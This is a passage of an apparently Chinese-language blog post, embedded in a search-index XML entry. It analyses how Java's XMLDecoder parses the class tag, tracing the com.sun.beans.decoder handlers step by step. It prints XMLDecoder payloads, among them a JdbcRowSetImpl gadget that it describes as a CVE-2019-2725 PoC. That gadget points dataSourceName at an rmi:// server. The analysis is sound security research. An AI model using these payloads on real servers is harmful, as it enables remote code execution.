class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依然会报找不到类的错误</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/8.png" class=""><p>只要保证如下这样就可以了，因为 class 标签只会将其标签下的字符和其直接 string 子标签中的字符添加到与之对应的<code>this.sb</code>中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>java.net.Socket<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>www.baidu.com<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那为什么包含类的 string 标签后面一定要添加<code>void</code>标签呢？如果去掉后面的 void 标签，直接跟其他标签行不行？上面的 xml 好理解，如果将 void 标签去掉，那么这些 string 标签中的字符就会直接拼接在一起了，导致成如下这样</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/9.png" class=""><p>那么如果是下面这个 xml 呢？这个也是<code>CVE-2019-2725</code>中用到的一个 poc </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSourceName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://rmi-server/xx<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果将 void 标签去掉，后面直接跟 property 标签呢，这样也杜绝了找不到类的问题</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSourceName&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://rmi-server/xx<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结果会报如下错误，简单来说就是在类中找不到 property 标签指定的方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/10.png" class=""><p>我们来跟踪调试一下</p><p>在解析 property 标签中的第一个 string 闭合标签时先进入<code>com.sun.beans.decoder.ElementHandler#endElement</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/11.png" class=""><p>继续往下跟进，进入<code>com.sun.beans.decoder.PropertyElementHandler#setValue</code>方法中，在这里要先调用<code>getContextBean</code>方法，来获取 property 父标签的 value</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/12.png" class=""><p>先跟进<code>com.sun.beans.decoder.ElementHandler#getContextBean</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/13.png" class=""><p>这里会调用<code>com.sun.beans.decoder.StringElementHandler#getValueObject</code>，因为 ClassElementHandler 没有这个方法，所以会调用其父类 StringElementHandler 的 getValueObject 方法，在这里面先调用<code>com.sun.beans.decoder.StringElementHandler#getValue</code>方法查找类，然后返回 this.value </p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/14.png" class=""><p>然后回到 getContextBean 方法中，返回 value 值</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/15.png" class=""><p>然后来到<code>com.sun.beans.decoder.PropertyElementHandler#setPropertyValue</code>方法，在<code>getContextBean</code>方法中返回的是个 Class 实例，并不是 JdbcRowSetImpl 类的实例，那么这里再 getClass 获取到的自然就是<code>java.lang.Class</code></p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/16.png" class=""><p>跟进<code>com.sun.beans.decoder.PropertyElementHandler#findSetter</code>方法，该方法就是用来查找指定类与 property 标签中 name 属性值对应的 setter 方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/17.png" class=""><p>通过<code>com.sun.beans.decoder.PropertyElementHandler#getProperty</code>方法来进行搜索，这里传入的是<code>java.lang.Class</code>自然不可能查找到<code>setDataSourceName</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/18.png" class=""><p>那为什么添加 void 标签后就可以呢，原因在于<code>getValueObject</code>方法的不同，添加后这里 property 标签的父标签就变成了 void</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/19.png" class=""><p>VoidElementHandler 类没有<code>getValueObject</code>方法，所以会调用其间接父类 NewElementHandler 的无参 <code>getValueObject</code>方法，然后在这里又会调用到其直接父类 ObjectElementHandler 的 getValueObject 方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/20.png" class=""><p>在<code>com.sun.beans.decoder.ObjectElementHandler#getValueObject</code>方法中也是先调用<code>com.sun.beans.decoder.NewElementHandler#getContextBean</code>方法</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/21.png" class=""><p>但是在该方法的下面会通过反射 new 一个 JdbcRowSetImpl 实例</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/22.png" class=""><p>此时在<code>com.sun.beans.decoder.PropertyElementHandler#setPropertyValue</code>方法中 getClass 获得的就是<code>com.sun.rowset.JdbcRowSetImpl</code>类而不是<code>java.lang.Class</code>了</p><img src="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/23.png" class="">]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
